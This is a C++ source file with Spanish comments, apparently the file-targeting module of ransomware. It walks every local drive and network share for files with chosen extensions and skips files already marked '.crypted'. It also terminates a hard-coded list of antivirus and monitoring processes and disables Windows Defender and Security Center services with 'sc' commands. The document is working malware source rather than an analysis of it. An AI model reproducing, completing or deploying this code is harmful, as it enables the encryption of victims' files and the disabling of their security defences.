#include "core/file_scanner.h"
#include <fstream>
#include <algorithm>
#include <tlhelp32.h>
#include <lm.h>

#pragma comment(lib, "netapi32.lib")

FileScanner::FileScanner() : 
    maxFileSize(DEFAULT_MAX_FILE_SIZE),
    minFileSize(DEFAULT_MIN_FILE_SIZE),
    scanNetworkDrives(true),
    scanRemovableDrives(false) {
    
    // Rutas de exclusión por defecto
    excludePaths = {
        "C:\\Windows",
        "C:\\Program Files",
        "C:\\Program Files (x86)",
        "C:\\ProgramData",
        "C:\\Recovery",
        "C:\\System Volume Information",
        "C:\\$Recycle.Bin"
    };
    
    // Procesos de seguridad por defecto a terminar
    excludeProcesses = {
        "msmpeng.exe",        // Windows Defender
        "msascui.exe",        // Windows Defender UI (interfaz)
        "SecurityHealthService.exe",
        "SgrmBroker.exe",
        "SgrmSvc.exe",
        "wdcsam.exe",         // McAfee
        "mcshield.exe",       // McAfee
        "mcuicnt.exe",        // McAfee
        "avp.exe",            // Kaspersky
        "kav.exe",            // Kaspersky
        "ekrn.exe",            // ESET
        "egui.exe",           // ESET
        "mbam.exe",           // Malwarebytes
        "mbamservice.exe",    // Malwarebytes
        "procexp.exe",        // Process Explorer
        "procmon.exe",        // Process Monitor
        "wireshark.exe",      // Wireshark
        "fiddler.exe"         // Fiddler
    };
}

FileScanner::~FileScanner() {
}

void FileScanner::SetTargetExtensions(const std::string* extensions, size_t count) {
    targetExtensions.clear();
    for (size_t i = 0; i < count; i++) {
        targetExtensions.push_back(extensions[i]);
    }
}

void FileScanner::AddExcludePath(const std::string& path) {
    excludePaths.push_back(path);
}

void FileScanner::AddExcludeProcess(const std::string& processName) {
    excludeProcesses.push_back(processName);
}

void FileScanner::SetFileSizeLimits(size_t minSize, size_t maxSize) {
    minFileSize = minSize;
    maxFileSize = maxSize;
}

void FileScanner::SetScanOptions(bool networkDrives, bool removableDrives) {
    scanNetworkDrives = networkDrives;
    scanRemovableDrives = removableDrives;
}

std::vector<std::string> FileScanner::ScanSystem() {
    std::vector<std::string> results;
    
    // Terminar procesos de seguridad primero
    KillSecurityProcesses();
    
    // Escanear todas las unidades
    ScanDrives(results);
    
    // Escanear network shares si está habilitado
    if (scanNetworkDrives) {
        ScanNetworkShares(results);
    }
    
    // Eliminar duplicados
    std::sort(results.begin(), results.end());
    results.erase(std::unique(results.begin(), results.end()), results.end());
    
    return results;
}

void FileScanner::ScanDrives(std::vector<std::string>& results) {
    DWORD drives = GetLogicalDrives();
    
    for (int i = 0; i < 26; i++) {
        if (drives & (1 << i)) {
            char driveLetter = 'A' + i;
            std::string drivePath = std::string(1, driveLetter) + ":\\";
            
            UINT driveType = GetDriveTypeA(drivePath.c_str());
            
            // Omitir unidades CD-ROM
            if (driveType == DRIVE_CDROM) continue;
            
            // Omitir unidades removibles si no están habilitadas
            if (driveType == DRIVE_REMOVABLE && !scanRemovableDrives) continue;
            
            // Escanear la unidad
            ScanDirectory(drivePath, results);
        }
    }
}

void FileScanner::ScanDirectory(const std::string& path, std::vector<std::string>& results) {
    if (!ShouldScanDirectory(path)) return;
    
    try {
        int currentDepth = 0;
        for (const auto& entry : fs::recursive_directory_iterator(path, fs::directory_options::skip_permission_denied)) {
            if (entry.is_regular_file()) {
                std::string filePath = entry.path().string();
                
                if (ShouldScanFile(filePath)) {
                    results.push_back(filePath);
                }
            }
            
            // Seguimiento simple de profundidad basado en la ruta
            std::string pathStr = entry.path().string();
            currentDepth = std::count(pathStr.begin(), pathStr.end(), '/') + 
                          std::count(pathStr.begin(), pathStr.end(), '\\') - 1;
            
            if (currentDepth >= MAX_SCAN_DEPTH) {
                break;
            }
        }
    }
    catch (const fs::filesystem_error& e) {
        // Ignorar errores de permisos y continuar
    }
    catch (...) {
        // Ignorar otros errores y continuar
    }
}

bool FileScanner::ShouldScanFile(const std::string& filePath) {
    // Verificar extensión de archivo
    std::string extension = fs::path(filePath).extension().string();
    std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);
    
    if (std::find(targetExtensions.begin(), targetExtensions.end(), extension) == targetExtensions.end()) {
        return false;
    }
    
    // Verificar tamaño de archivo
    try {
        uintmax_t fileSize = fs::file_size(filePath);
        if (fileSize < minFileSize || fileSize > maxFileSize) {
            return false;
        }
    }
    catch (...) {
        return false;
    }
    
    // Verificar si el archivo está bloqueado
    if (IsFileLocked(filePath)) {
        return false;
    }
    
    // Verificar si es un archivo del sistema
    if (IsSystemFile(filePath)) {
        return false;
    }
    
    // Verificar si ya está encriptado
    if (filePath.length() > 7 && filePath.substr(filePath.length() - 7) == ".crypted") {
        return false;
    }
    
    return true;
}

bool FileScanner::ShouldScanDirectory(const std::string& dirPath) {
    // Verificar si el directorio está en la lista de exclusión
    for (const auto& excludePath : excludePaths) {
        if (dirPath.find(excludePath) == 0) {
            return false;
        }
    }
    
    // Omitir directorios ocultos y del sistema
    DWORD attributes = GetFileAttributesA(dirPath.c_str());
    if (attributes & (FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
        return false;
    }
    
    return true;
}

bool FileScanner::IsFileLocked(const std::string& filePath) {
    HANDLE hFile = CreateFileA(filePath.c_str(), GENERIC_READ, 0, NULL, 
                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) {
        return GetLastError() == ERROR_SHARING_VIOLATION;
    }
    
    CloseHandle(hFile);
    return false;
}

bool FileScanner::IsSystemFile(const std::string& filePath) {
    DWORD attributes = GetFileAttributesA(filePath.c_str());
    return (attributes & FILE_ATTRIBUTE_SYSTEM) != 0;
}

void FileScanner::ScanNetworkShares(std::vector<std::string>& results) {
    // Enumerar network shares
    NET_API_STATUS status;
    LPSHARE_INFO_1 pBuf = NULL;
    LPSHARE_INFO_1 pTmpBuf;
    DWORD entriesRead = 0;
    DWORD totalEntries = 0;
    DWORD resumeHandle = 0;
    
    do {
        status = NetShareEnum(NULL, 1, (LPBYTE*)&pBuf, MAX_PREFERRED_LENGTH,
                             &entriesRead, &totalEntries, &resumeHandle);
        
        if (status == NERR_Success || status == ERROR_MORE_DATA) {
            pTmpBuf = pBuf;
            
            for (DWORD i = 0; i < entriesRead; i++) {
                if (pTmpBuf->shi1_type == STYPE_DISKTREE) {
                    std::wstring wideNetname(pTmpBuf->shi1_netname);
                    std::string netname(wideNetname.begin(), wideNetname.end());
                    std::string sharePath = "\\\\" + std::string(getenv("COMPUTERNAME")) + "\\" + netname;
                    ScanDirectory(sharePath, results);
                }
                pTmpBuf++;
            }
        }
        
        if (pBuf != NULL) {
            NetApiBufferFree(pBuf);
            pBuf = NULL;
        }
        
    } while (status == ERROR_MORE_DATA);
    
    if (pBuf != NULL) {
        NetApiBufferFree(pBuf);
    }
}

std::vector<std::string> FileScanner::ScanUserProfiles() {
    std::vector<std::string> results;
    
    // Obtener todos los perfiles de usuario
    char profilesPath[MAX_PATH];
    if (ExpandEnvironmentStringsA("%SystemDrive%\\Users", profilesPath, MAX_PATH)) {
        ScanDirectory(profilesPath, results);
    }
    
    return results;
}

std::vector<std::string> FileScanner::ScanPath(const std::string& path) {
    std::vector<std::string> results;
    ScanDirectory(path, results);
    return results;
}

void FileScanner::KillSecurityProcesses() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;
    
    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
    
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (IsSecurityProcess(pe.szExeFile)) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (hProcess) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    
    CloseHandle(hSnapshot);
}

bool FileScanner::IsSecurityProcess(const std::string& processName) {
    std::string lowerName = processName;
    std::transform(lowerName.begin(), lowerName.end(), lowerName.begin(), ::tolower);
    
    for (const auto& excludeProcess : excludeProcesses) {
        if (lowerName.find(excludeProcess) != std::string::npos) {
            return true;
        }
    }
    
    return false;
}

std::vector<FileInfo> FileScanner::GetFileInfo(const std::vector<std::string>& filePaths) {
    std::vector<FileInfo> fileInfos;
    
    for (const auto& filePath : filePaths) {
        fileInfos.emplace_back(filePath);
    }
    
    return fileInfos;
}

size_t FileScanner::GetTotalFileSize(const std::vector<std::string>& filePaths) {
    size_t totalSize = 0;
    
    for (const auto& filePath : filePaths) {
        try {
            totalSize += fs::file_size(filePath);
        }
        catch (...) {
            // Omitir archivos inaccesibles
        }
    }
    
    return totalSize;
}

std::string FileScanner::GetFileType(const std::string& filePath) {
    return fs::path(filePath).extension().string();
}

bool FileScanner::IsFileAccessible(const std::string& filePath) {
    HANDLE hFile = CreateFileA(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, 
                              NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    CloseHandle(hFile);
    return true;
}

void FileScanner::StopSecurityServices() {
    // Detener Windows Defender
    system("sc stop WinDefend");
    system("sc config WinDefend start= disabled");
    
    // Detener otros servicios de seguridad
    system("sc stop wscsvc");
    system("sc config wscsvc start= disabled");
    
    system("sc stop SecurityHealthService");
    system("sc config SecurityHealthService start= disabled");
}

void FileInfo::GetFileInfo() {
    try {
        size = fs::file_size(path);
        extension = fs::path(path).extension().string();
        
        // Obtener tiempo del archivo
        HANDLE hFile = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, 
                                  NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        
        if (hFile != INVALID_HANDLE_VALUE) {
            GetFileTime(hFile, NULL, NULL, &lastModified);
            CloseHandle(hFile);
        }
    }
    catch (...) {
        size = 0;
        extension = "";
    }
}
